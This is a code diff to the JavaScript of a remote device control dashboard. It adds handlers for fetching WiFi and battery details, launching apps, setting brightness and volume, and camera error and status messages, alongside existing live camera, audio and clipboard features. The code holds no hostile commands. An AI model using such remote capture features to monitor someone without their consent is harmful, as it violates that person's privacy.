@@ -223,6 +223,18 @@ socket.on('camera:frame', function(data) {
   placeholder.style.display = 'none';
 });
 
+socket.on('camera:error', function(data) {
+  showToast('Camera Error: ' + data.error, 'error');
+});
+
+socket.on('camera:status', function(data) {
+  if (data.status === 'streaming') {
+    showToast('Camera streaming started', 'success');
+  } else if (data.status === 'stopped') {
+    showToast('Camera stopped', 'info');
+  }
+});
+
 // ---- Live Audio Playback ----
 socket.on('camera:audio', function(data) {
   if (liveAudioMuted || !data.audio) return;
@@ -1569,6 +1581,95 @@ socket.on('clipboard:content', function(data) {
     showToast('Clipboard received', 'success');
   }
 });
+
+// ---- WiFi Info ----
+function getWifiInfo() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:wifi:info', { deviceId: deviceId });
+  document.getElementById('wifiResult').style.display = 'block';
+  document.getElementById('wifiResult').textContent = 'Fetching WiFi info...';
+}
+socket.on('wifi:info', function(data) {
+  var el = document.getElementById('wifiResult');
+  if (el) {
+    el.style.display = 'block';
+    el.innerHTML = '<b>SSID:</b> ' + escapeHtml(data.ssid || '--') + '<br>' +
+      '<b>IP:</b> ' + escapeHtml(data.ipAddress || '--') + '<br>' +
+      '<b>Signal:</b> ' + (data.rssi || '--') + ' dBm<br>' +
+      '<b>Speed:</b> ' + (data.linkSpeed || '--') + ' Mbps<br>' +
+      '<b>Frequency:</b> ' + (data.frequency || '--') + ' MHz<br>' +
+      '<b>MAC:</b> ' + escapeHtml(data.macAddress || '--') + '<br>' +
+      '<b>Enabled:</b> ' + (data.enabled ? 'Yes' : 'No');
+    showToast('WiFi info received', 'success');
+  }
+});
+
+// ---- Battery Info ----
+function getBatteryInfo() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:battery:info', { deviceId: deviceId });
+  document.getElementById('batteryResult').style.display = 'block';
+  document.getElementById('batteryResult').textContent = 'Fetching battery info...';
+}
+socket.on('battery:info', function(data) {
+  var el = document.getElementById('batteryResult');
+  if (el) {
+    el.style.display = 'block';
+    el.innerHTML = '<b>Level:</b> ' + (data.level || '--') + '%<br>' +
+      '<b>Charging:</b> ' + (data.charging ? 'Yes' : 'No') + '<br>' +
+      '<b>Plug Type:</b> ' + escapeHtml(data.plugType || '--') + '<br>' +
+      '<b>Health:</b> ' + escapeHtml(data.health || '--') + '<br>' +
+      '<b>Temperature:</b> ' + (data.temperature || '--') + '°C<br>' +
+      '<b>Voltage:</b> ' + (data.voltage || '--') + 'V<br>' +
+      '<b>Technology:</b> ' + escapeHtml(data.technology || '--');
+    showToast('Battery info received', 'success');
+  }
+});
+
+// ---- Launch App ----
+function launchApp() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var pkg = document.getElementById('launchPackage').value.trim();
+  if (!pkg) { showToast('Enter package name', 'error'); return; }
+  socket.emit('command:app:launch', { deviceId: deviceId, packageName: pkg });
+  document.getElementById('launchResult').textContent = 'Launching...';
+}
+socket.on('app:launched', function(data) {
+  var el = document.getElementById('launchResult');
+  if (el) {
+    if (data.success) {
+      el.textContent = 'App launched: ' + data.packageName;
+      el.style.color = 'var(--success)';
+      showToast('App launched!', 'success');
+    } else {
+      el.textContent = data.error || 'Launch failed';
+      el.style.color = 'var(--error)';
+      showToast(data.error || 'Launch failed', 'error');
+    }
+  }
+});
+
+// ---- Brightness Control ----
+function setBrightness() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var level = parseInt(document.getElementById('brightnessSlider').value);
+  socket.emit('command:brightness:set', { deviceId: deviceId, level: level });
+  showToast('Brightness set to ' + level, 'info');
+}
+
+// ---- Volume Control ----
+function setVolume() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var level = parseInt(document.getElementById('volumeSlider').value);
+  var type = document.getElementById('volumeType').value;
+  socket.emit('command:volume:set', { deviceId: deviceId, level: level, type: type });
+  showToast('Volume set to ' + level + '%', 'info');
+}
 
 // ============ INSTALLED APPS ============
 var allApps = [];
